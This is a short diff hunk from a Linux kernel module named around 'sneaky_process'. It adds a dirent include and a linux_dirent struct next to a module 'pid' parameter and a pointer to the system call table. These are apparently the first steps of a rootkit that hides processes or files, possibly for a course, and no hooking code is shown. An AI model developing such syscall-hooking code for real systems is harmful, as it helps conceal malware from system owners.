@@ -8,11 +8,20 @@
 #include <linux/kallsyms.h>
 #include <asm/page.h>
 #include <asm/cacheflush.h>
+#include <linux/dirent.h>
 
 #define PREFIX "sneaky_process"
 
 static char * pid;
 module_param(pid, charp, 0);
+
+struct linux_dirent {
+    unsigned long  d_ino;     /* Inode number */
+    unsigned long  d_off;     /* Offset to next linux_dirent */
+    unsigned short d_reclen;  /* Length of this linux_dirent */
+    char           d_name[];  /* Filename (null-terminated) */
+};
+typedef struct linux_dirent linux_dirent_t; 
 
 //This is a pointer to the system call table
 static unsigned long *sys_call_table;
